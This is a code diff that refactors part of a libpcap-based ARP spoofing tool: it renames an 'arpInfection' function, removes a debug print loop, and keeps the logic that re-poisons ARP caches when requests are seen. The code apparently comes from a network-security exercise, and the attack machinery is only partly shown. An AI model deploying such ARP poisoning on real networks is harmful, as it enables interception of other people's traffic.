@@ -134,7 +134,7 @@ int getMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *
     return 0;
 }
 
-int arpInfection(pcap_t *handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip)
+int arpInfect(pcap_t *handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip)
 {
     EthArpPacket packet_;
 
@@ -200,23 +200,17 @@ int main(int argc, char *argv[])
         }
 
         flow[i].target_ip = Ip(argv[(i + 1) * 2 + 1]);
-        Mac target_mac;
         if (getMac(handle, attacker_ip, attacker_mac, flow[i].target_ip, &flow[i].target_mac) == -1)
         {
             printf("ERR: getMac()\n");
             return -1;
         }
 
-        if (arpInfection(handle, attacker_mac, flow[i].sender_ip, flow[i].sender_mac, flow[i].target_ip) == -1)
+        if (arpInfect(handle, attacker_mac, flow[i].sender_ip, flow[i].sender_mac, flow[i].target_ip) == -1)
         {
-            printf("ERR: arpInfection()\n");
+            printf("ERR: arpInfect()\n");
             return -1;
         }
-    }
-
-    for (int i = 0; i < num_victim; i++)
-    {
-        printf("%s %s %s %s\n", std::string(flow[i].sender_ip).data(), std::string(flow[i].sender_mac).data(), std::string(flow[i].target_ip).data(), std::string(flow[i].target_mac).data());
     }
 
     while (true)
@@ -257,9 +251,9 @@ int main(int argc, char *argv[])
                 struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
                 if (ntohs(arp_hdr->op_) == ArpHdr::Request && (ntohl(arp_hdr->tip_) == flow[i].target_ip || ntohl(arp_hdr->sip_) == flow[i].target_ip))
                 {
-                    if (arpInfection(handle, attacker_mac, flow[i].sender_ip, flow[i].sender_mac, flow[i].target_ip) == -1)
+                    if (arpInfect(handle, attacker_mac, flow[i].sender_ip, flow[i].sender_mac, flow[i].target_ip) == -1)
                     {
-                        printf("ERR: arpInfection()\n");
+                        printf("ERR: arpInfect()\n");
                         return -1;
                     }
                 }
